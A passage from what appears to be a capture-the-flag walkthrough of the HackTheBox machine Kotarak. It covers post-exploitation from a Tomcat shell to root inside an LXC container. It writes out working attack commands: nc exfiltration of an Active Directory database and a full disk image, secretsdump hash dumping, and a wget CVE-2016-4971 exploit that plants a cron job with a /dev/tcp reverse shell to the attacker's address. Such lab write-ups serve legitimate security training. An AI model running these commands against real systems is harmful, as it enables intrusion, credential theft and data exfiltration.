+tomcat@kotarak-dmz:/$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+oxdf@parrot$ stty raw -echo ; fg
+nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+                                                                         
+tomcat@kotarak-dmz:/$
+</code></pre></div></div>
+<h2 id="shell-as-atanas-on-dmz">Shell as atanas on dmz</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="hosts">Hosts</h4>
+<p>The hostname with this shell is kotarak-dmz, which implies there’s another host I will try to go after.</p>
+<p>The <code class="language-plaintext highlighter-rouge">ifconfig</code> shows that the IP of this host is 10.10.10.55, which for HTB means that I’m on the main VM. There’s also a lxcbr0 adapter with the IP 10.0.3.1. LXC is a container system, so I suspect I need to get into a container on that network.</p>
+<h4 id="homedirs">Homedirs</h4>
+<p>I’ll There are two home directories on this dmz host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@kotarak-dmz:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">atanas  tomcat
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">user.txt</code> is in <code class="language-plaintext highlighter-rouge">atanas</code>, but I can’t read it as tomcat:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@kotarak-dmz:/home$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> atanas/
+<span class="go">total 4
+-rw-rw---- 1 atanas atanas 33 Jul 19  2017 user.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home/tomcat</code> (which isn’t actually the home directory for the tomcat user, but it’s still there) holds two files in a subdirectory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@kotarak-dmz:/home/tomcat$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./to_archive/pentest_data/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
+./to_archive/pentest_data/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">.bin</code> reports to be a Windows registry file, where as <code class="language-plaintext highlighter-rouge">file</code> doesn’t recognize the <code class="language-plaintext highlighter-rouge">.dit</code> as anything more than data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$</span><span class="w"> </span>file <span class="k">*</span>
+<span class="go">20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data
+20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">.dit</code> is likely the active directory database from a domain controller, <code class="language-plaintext highlighter-rouge">ntds.dit</code>.</p>
+<p>I’ll exfil each over <code class="language-plaintext highlighter-rouge">nc</code>. For example, I’ll start a listener with <code class="language-plaintext highlighter-rouge">nc -lnvp 443 &gt; 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit</code> on my VM, and then run <code class="language-plaintext highlighter-rouge">cat 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit | nc 10.10.14.15 443</code> on Kotarak.</p>
+<h3 id="recover-passwords">Recover Passwords</h3>
+<h4 id="dump-hashes">Dump Hashes</h4>
+<p><code class="language-plaintext highlighter-rouge">secretsdump</code> will extract all the hashes from an <code class="language-plaintext highlighter-rouge">ntds.dit</code> file using the SYSTEM reg hive to decrypt:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>secretsdump.py <span class="nt">-ntds</span> 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit <span class="nt">-system</span> 20170721114637_de
+<span class="go">fault_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL | tee addump
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient                                           
+[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
+[*] Reading and decrypting hashes from 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
+WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
+WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
+WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
+WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
+atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+...[snip]...
+</span></code></pre></div></div>
+<p>I’ve used <code class="language-plaintext highlighter-rouge">tee</code> to write the output to a file so I can easily grab the NTLM hashes from the output:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>addump | <span class="nb">grep</span> <span class="s2">":::"</span> | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f4</span>
+<span class="go">e64fe0f24ba2489c05e64354d74ebd11
+31d6cfe0d16ae931b73c59d7e0c089c0
+668d49ebfdb70aeee8bcaeac9e3e66fd
+ca1ccefcb525db49828fbb9d68298eee
+160f6c1db2ce0994c19c46a349611487
+6f5e87fd20d1d8753896f6c9cb316279
+cdd7a7f43d06b3a91705900a592f3772
+24473180acbcc5f7d2731abe05cfa88c
+2b576acbe6bcfda7294d6bd18041b8fe
+</span></code></pre></div></div>
+<h4 id="crack">Crack</h4>
+<p>I can run these through <code class="language-plaintext highlighter-rouge">hashcat</code>, but as NTLM hashes aren’t salted per user, any word I would check without some customization to the target has already been calculated by sites like <a href="https://crackstation.net/">crackstation.net</a>. Three of the passwords break:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210515061224000.webp" type="image/webp"/>
+<img alt="image-20210515061224000" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210515061224000.png"/>
+</picture>
+<p>The empty password isn’t too useful, but I’ll note the other two. Password123! is associated with the atanas user in this dump, and f16tomcat! is associated with the administrator account.</p>
+<h3 id="su">su</h3>
+<p>atanas doesn’t have permissions to SSH using a password, but this password will work with <code class="language-plaintext highlighter-rouge">su</code> from the local shell as tomcat:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@kotarak-dmz:~$</span><span class="w"> </span>su atanas -
+<span class="go">Password: 
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">atanas@kotarak-dmz:/opt/tomcat$</span><span class="w">
+</span></code></pre></div></div>
+<p>atanas has permission to read <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">93f844f5************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>Unlike most HTB machines, as this user I can enter and list files in <code class="language-plaintext highlighter-rouge">/root</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+-rw------- 1 atanas root 333 Jul 20  2017 app.log
+-rw------- 1 atanas root  66 Aug 29  2017 flag.txt
+</span></code></pre></div></div>
+<p>In fact, not only can I list the files, but read both <code class="language-plaintext highlighter-rouge">flag.txt</code> and <code class="language-plaintext highlighter-rouge">app.log</code>. <code class="language-plaintext highlighter-rouge">flag.txt</code> is a hint to continue looking:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span><span class="nb">cat </span>flag.txt 
+<span class="go">Getting closer! But what you are looking for can't be found here.
+</span></code></pre></div></div>
+<p>I interpret this to mean that it’s on another host, as I noted earlier that there are likely containers involved on this system.</p>
+<p><code class="language-plaintext highlighter-rouge">app.log</code> shows what look like Apache <code class="language-plaintext highlighter-rouge">access.log</code> entries:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+</code></pre></div></div>
+<p>Some observations:</p>
+<ol>
+<li>
+<p>There’s another system on 10.0.3.133. This makes sense given I noted the additional IP address on this host of 10.0.3.1 earlier. That host still exists:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span>ping <span class="nt">-c</span> 1 10.0.3.133
+<span class="go">PING 10.0.3.133 (10.0.3.133) 56(84) bytes of data.
+64 bytes from 10.0.3.133: icmp_seq=1 ttl=64 time=0.070 ms
+   
+--- 10.0.3.133 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms
+</span></code></pre></div> </div>
+</li>
+<li>
+<p>The requests seem to be arriving every two minutes.</p>
+</li>
+<li>
+<p>The requests come from <code class="language-plaintext highlighter-rouge">wget</code>, version 1.16.</p>
+</li>
+</ol>
+<h3 id="requests">Requests</h3>
+<h4 id="binding">Binding</h4>
+<p>The first question I had is if these requests are still coming. To check that, I need some way to listen on port 80 on this host. Unfortunately, by default, a non-root user can’t listen on a port below 1024:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 80
+<span class="go">nc: Permission denied
+</span><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Traceback (most recent call last):
+  File "/usr/lib/python3.5/runpy.py", line 184, in _run_module_as_main
+    "__main__", mod_spec)
+  File "/usr/lib/python3.5/runpy.py", line 85, in _run_code
+    exec(code, run_globals)
+  File "/usr/lib/python3.5/http/server.py", line 1221, in &lt;module&gt;
+    test(HandlerClass=handler_class, port=args.port, bind=args.bind)
+  File "/usr/lib/python3.5/http/server.py", line 1194, in test
+    httpd = ServerClass(server_address, HandlerClass)
+  File "/usr/lib/python3.5/socketserver.py", line 440, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.5/http/server.py", line 138, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.5/socketserver.py", line 454, in server_bind
+    self.socket.bind(self.server_address)
+PermissionError: [Errno 13] Permission denied
+</span></code></pre></div></div>
+<p>I spent a bit of time looking for any binaries with capabilities that might allow them to bind, but no luck. I did come across <code class="language-plaintext highlighter-rouge">authbind</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span>which authbind 
+<span class="go">/usr/bin/authbind
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">authbind</code> is a program that <a href="https://en.wikipedia.org/wiki/Authbind">allows non-root users to bind on low ports</a>.</p>
+<p>With <code class="language-plaintext highlighter-rouge">authbind</code>, I’m able to listen on port 80 without issue:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/root$</span><span class="w"> </span>authbind nc <span class="nt">-lnvp</span> 80
+<span class="go">Listening on [0.0.0.0] (family 0, port 80)
+</span></code></pre></div></div>
+<h4 id="request">Request</h4>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">nc</code> so I can see what a full request looks like if it comes. In less than two minutes, I get a connection from 10.0.3.133:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 49700)
+GET /archive.tar.gz HTTP/1.1
+User-Agent: Wget/1.16 (linux-gnu)
+Accept: */*
+Host: 10.0.3.1
+Connection: Keep-Alive
+</code></pre></div></div>
+<p>Still using <code class="language-plaintext highlighter-rouge">wget</code> to request <code class="language-plaintext highlighter-rouge">/archive.tar.gz</code>.</p>
+<h3 id="wget-vulnerability">wget Vulnerability</h3>
+<h4 id="cve-2016-4971">CVE-2016-4971</h4>
+<p>The default <code class="language-plaintext highlighter-rouge">wget</code> behavior is to write the requested file to disk in the current directory with the filename indicated by the url. So when <code class="language-plaintext highlighter-rouge">wget</code> requests <code class="language-plaintext highlighter-rouge">http://website.com/folder/file.txt</code>, the default behavior is to save that as <code class="language-plaintext highlighter-rouge">./file.txt</code>.</p>
+<p>CVE-2016-4971 is a neat exploit against Wget version &lt; 1.18 that abuses has <code class="language-plaintext highlighter-rouge">wget</code> handles an HTTP redirect to an FTP server. When <code class="language-plaintext highlighter-rouge">wget</code> redirects to another address using http, it would get that file but still save it as the original requested filename.</p>
+<p>So for example, if <code class="language-plaintext highlighter-rouge">wget</code> sends a GET request to <code class="language-plaintext highlighter-rouge">http://website.com/folder/file.txt</code>, and the server responds with a 301 or 302 redirect to <code class="language-plaintext highlighter-rouge">ftp://evil-server.com/evil.txt</code>, <code class="language-plaintext highlighter-rouge">wget</code> will go get that file (which is fine) and save it as <code class="language-plaintext highlighter-rouge">evil.txt</code> (which is not fine).</p>
+<p>Especially in a <code class="language-plaintext highlighter-rouge">cron</code> scenario, the jobs typically run out of the running user’s home directory. The ability to write arbitrary files in a home directory is dangerous.</p>
+<h4 id="poc">POC</h4>
+<p>There are many ways to exploit this vulnerability. I could drop a <code class="language-plaintext highlighter-rouge">.bashrc</code> file and wait for someone to start a shell. If I thought perhaps the <code class="language-plaintext highlighter-rouge">wget</code> was being run from a web directory, I could look at uploading a webshell.</p>
+<p>There’s a proof of concept for this CVE on <a href="https://www.exploit-db.com/exploits/40064">exploitdb</a>. It’s strategy is to write a Wget Startup file. Based on the <a href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html">priority</a> <code class="language-plaintext highlighter-rouge">wget</code> looks for these files, as long as there’s nothing in the <code class="language-plaintext highlighter-rouge">/usr/local/etc/wgetrc</code> and the env variable <code class="language-plaintext highlighter-rouge">WGETRC</code> isn’t set, it will try to load from <code class="language-plaintext highlighter-rouge">$HOME/.wgetrc</code>.</p>
+<p>This fill will set arguments for <code class="language-plaintext highlighter-rouge">wget</code> that aren’t passed on the command line. The POC uses two of these with the following <code class="language-plaintext highlighter-rouge">.wgetrc</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>post_file = /etc/shadow
+output_document = /etc/cron.d/wget-root-shell
+</code></pre></div></div>
+<p>This sets two <a href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html">options</a>:</p>
+<ul>
+<li>
+<p><code class="language-plaintext highlighter-rouge">post_file</code>:</p>
+<blockquote>
+<p>Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘–post-file=file’.</p>
+</blockquote>
+</li>
+<li>
+<p><code class="language-plaintext highlighter-rouge">output_document</code>:</p>
+<blockquote>
+<p>Set the output filename—the same as ‘-O file’.</p>
+</blockquote>
+</li>
+</ul>
+<p>This POC will exploit over the course of two requests (so it’s targeted against a process where <code class="language-plaintext highlighter-rouge">wget</code> is running on <code class="language-plaintext highlighter-rouge">cron</code>, which seems perfect for Kotarak).</p>
+<p>The first request is what is exploited by this exploit, to write the <code class="language-plaintext highlighter-rouge">.wgetrc</code> file into the running home directory. The next time it goes to make the same request, it will POST the shadow file, and then save the result into the <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> directory.</p>
+<h4 id="run-it">Run It</h4>
+<p>I’ll need multiple shells on the box, either by trigger the WAR file a few times. I’ll work out of a directory in <code class="language-plaintext highlighter-rouge">/tmp</code>. In one shell, I’ll drop the <code class="language-plaintext highlighter-rouge">.wgetrc</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/tmp/.0xdf$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">_EOF_</span><span class="sh">&gt;.wgetrc                              
+</span><span class="go">&gt; post_file = /etc/shadow
+&gt; output_document = /etc/cron.d/wget-root-shell                                 
+&gt; _EOF_  
+</span></code></pre></div></div>
+<p>And start a Python FTP server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/tmp/.0xdf$</span><span class="w"> </span>authbind python <span class="nt">-m</span> pyftpdlib <span class="nt">-p21</span> <span class="nt">-w</span>
+<span class="go">/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
+  RuntimeWarning)
+[I 2021-05-15 13:32:46] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=26421 &lt;&lt;&lt;
+[I 2021-05-15 13:32:46] concurrency model: async
+[I 2021-05-15 13:32:46] masquerade (NAT) address: None
+[I 2021-05-15 13:32:46] passive ports: None
+</span></code></pre></div></div>
+<p>I’ll save a copy of the Python POC locally and make a few edits. It’s got <code class="language-plaintext highlighter-rouge">go_GET</code> and a <code class="language-plaintext highlighter-rouge">do_POST</code> methods to handle incoming requests. It assumed the first request will be a GET, and will redirect that to get the <code class="language-plaintext highlighter-rouge">.wgetrc</code>. Then the next request will be a POST if that worked, and that’s where it returns the <code class="language-plaintext highlighter-rouge">cron</code> file. Those functions are fine. There’s some configuration at the bottom that needs updating:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.0.3.1</span><span class="sh">'</span> 
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="sh">'</span><span class="s">10.10.10.55</span><span class="sh">'</span> 
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="sh">"</span><span class="s">* * * * * root bash -c </span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1</span><span class="sh">'</span><span class="s"> </span><span class="se">\n</span><span class="sh">"</span>
+</code></pre></div></div>
+<p>The HTTP listen needs to be on the IP that the container is connecting to.</p>
+<p>Now the <code class="language-plaintext highlighter-rouge">cron</code> will result in a reverse shell. With a Python webserver in my VM, I’ll grab it with <code class="language-plaintext highlighter-rouge">wget</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/tmp/.0xdf$</span><span class="w"> </span>wget 10.10.14.15/wget_exploit.py
+<span class="go">--2021-05-15 13:38:07--  http://10.10.14.15/wget_exploit.py
+Connecting to 10.10.14.15:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2616 (2.6K) [text/x-python]
+Saving to: ‘wget_exploit.py’
+
+wget_exploit.py     100%[===================&gt;]   2.55K  --.-KB/s    in 0.001s  
+
+2021-05-15 13:38:07 (2.50 MB/s) - ‘wget_exploit.py’ saved [2616/2616]
+</span></code></pre></div></div>
+<p>Now run it with <code class="language-plaintext highlighter-rouge">authbind</code>, and it checks that the FTP server is good, and then waits:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/tmp/.0xdf$</span><span class="w"> </span>authbind python wget_exploit.py 
+<span class="go">Ready? Is your FTP server running?
+FTP found open on 10.10.10.55:21. Let's go then
+
+Serving wget exploit on port 80...
+</span></code></pre></div></div>
+<p>There is a connection at the FTP server as well:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[I 2021-05-15 13:43:25] 10.10.10.55:36996-[] FTP session opened (connect)
+</code></pre></div></div>
+<p>After a minute, the first request comes in, a GET, and it’s handled with the redirect:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We have a volunteer requesting /archive.tar.gz by GET :)
+
+Uploading .wgetrc via ftp redirect vuln. It should land in /root 
+
+10.0.3.133 - - [15/May/2021 13:44:01] "GET /archive.tar.gz HTTP/1.1" 301 -
+Sending redirect to ftp://anonymous@10.10.10.55:21/.wgetrc
+</code></pre></div></div>
+<p>Immediately after there’s another connecting on FTP:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[I 2021-05-15 13:44:01] 10.0.3.133:38434-[] FTP session opened (connect)
+[I 2021-05-15 13:44:01] 10.0.3.133:38434-[anonymous] USER 'anonymous' logged in.
+[I 2021-05-15 13:44:01] 10.0.3.133:38434-[anonymous] RETR /tmp/.0xdf/.wgetrc completed=1 bytes=70 seconds=0.002
+[I 2021-05-15 13:44:01] 10.0.3.133:38434-[anonymous] FTP session closed (disconnect).
+</code></pre></div></div>
+<p>Now the config file is in place, the next time the script tries to run, I should see a POST request. It worked:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We have a volunteer requesting /archive.tar.gz by POST :)
+                                        
+Received POST from wget, this should be the extracted /etc/shadow file:   
+
+---[begin]---
+ root:*:17366:0:99999:7:::
+daemon:*:17366:0:99999:7:::
+bin:*:17366:0:99999:7:::
+...[snip]...
+sshd:*:17366:0:99999:7:::
+ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7:::
+  
+---[eof]---
+
+
+Sending back a cronjob script as a thank-you for the file...
+It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
+10.0.3.133 - - [15/May/2021 13:46:01] "POST /archive.tar.gz HTTP/1.1" 200 -
+
+File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :)
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">shadow</code> file doesn’t have anything that useful in it. But hopefully this indicates that the <code class="language-plaintext highlighter-rouge">cron</code> was written. One minute later:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 48402
+bash: cannot set terminal process group (3240): Inappropriate ioctl for device
+bash: no job control in this shell
+root@kotarak-int:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>This shell on the on host kotarak-int, and it has landed me as root. I can read <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kotarak-int:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">950d1425************************
+</span></code></pre></div></div>
+<h3 id="alternative-root-via-disk">Alternative Root via Disk</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>I actually found this root before finding the intended path. The first thing I check when I get a shell is the groups the user is in with the <code class="language-plaintext highlighter-rouge">id</code> command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:/$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)
+</span></code></pre></div></div>
+<p>I also knew at this point that there was another container involved this box, and that I likely needed to get into it. I don’t see the lxc group here (or docker if this was running in Docker containers), which doesn’t let me interact with the container directly. But atanas is in the disk group, which gives access to the raw devices.</p>
+<p><code class="language-plaintext highlighter-rouge">lsblk</code> shows how the devices are configured:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:~$</span><span class="w"> </span>lsblk
+<span class="go">NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda                      8:0    0   12G  0 disk 
+├─sda1                   8:1    0  120M  0 part /boot
+├─sda2                   8:2    0    1K  0 part 
+└─sda5                   8:5    0 11.9G  0 part 
+  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
+  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
+sr0                     11:0    1 1024M  0 rom 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">Kotarak--vg-root</code> and <code class="language-plaintext highlighter-rouge">Kotarak--vg-swap_1</code> are the root file system and swap space under LVM. Both live on the <code class="language-plaintext highlighter-rouge">sda5</code> partition on <code class="language-plaintext highlighter-rouge">sda</code>. The LVM mappings live in <code class="language-plaintext highlighter-rouge">/dev/mapper</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/mapper/
+<span class="go">total 0
+crw------- 1 root root 10, 236 May 14 20:51 control
+lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-root -&gt; ../dm-0
+lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-swap_1 -&gt; ../dm-1
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">dm-0</code> is the device I want to read off to get the root of the filesystem.</p>
+<h4 id="exfil-filesystem">Exfil Filesystem</h4>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">dd</code> to read from the device, and <code class="language-plaintext highlighter-rouge">nc</code> to copy the entire filesystem off the device back to my host. I’ll send it through <code class="language-plaintext highlighter-rouge">gzip</code> to compress it so that it will move faster, but it still takes over seven minutes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">atanas@kotarak-dmz:~$</span><span class="w"> </span><span class="nb">time dd </span><span class="k">if</span><span class="o">=</span>/dev/dm-0 | <span class="nb">gzip</span> <span class="nt">-1</span> - | nc 10.10.14.15 443
+<span class="go">14680064+0 records in
+14680064+0 records out
+7516192768 bytes (7.5 GB, 7.0 GiB) copied, 438.725 s, 17.1 MB/s
+
+real    7m18.932s
+user    2m4.900s
+sys     0m25.648s
+</span></code></pre></div></div>
+<p>Back on my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443 <span class="o">&gt;</span> dm-0.gz
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 34610
+</span></code></pre></div></div>
+<p>When it’s done, the compressed file is a bit over two gigs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lh</span> dm-0.gz
+<span class="go">-rwxrwx--- 1 root vboxsf 2.2G May 15 15:21 dm-0.gz
+</span></code></pre></div></div>
+<p>It decompresses to seven gigs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">gunzip </span>dm-0.gz 
+<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lh</span> dm-0 
+<span class="go">-rwxrwx--- 1 root vboxsf 7.0G May 15 15:40 dm-0
+</span></code></pre></div></div>
+<p>I can mount it, and access the file system:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>mount dm-0-orig /mnt/
+<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">ls</span> /mnt/
+<span class="go">backups  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/root</code> is the host system, with <code class="language-plaintext highlighter-rouge">flag.txt</code>, not the container with <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
